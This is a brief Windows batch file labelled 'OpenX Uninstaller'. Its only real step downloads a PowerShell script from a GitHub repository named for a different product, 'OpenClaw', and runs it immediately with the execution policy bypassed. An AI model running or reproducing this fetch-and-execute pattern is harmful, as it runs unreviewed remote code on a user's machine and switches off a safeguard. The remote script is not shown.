@echo off
title OpenX Uninstaller

echo.
echo ========================================
echo   OpenX Uninstaller
echo ========================================
echo.
echo Starting uninstaller...
echo.

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aibgsps-sys/OpenClaw-Uninstall-Tool/main/uninstall.ps1' -OutFile $env:TEMP\uninstall.ps1; & $env:TEMP\uninstall.ps1"

pause
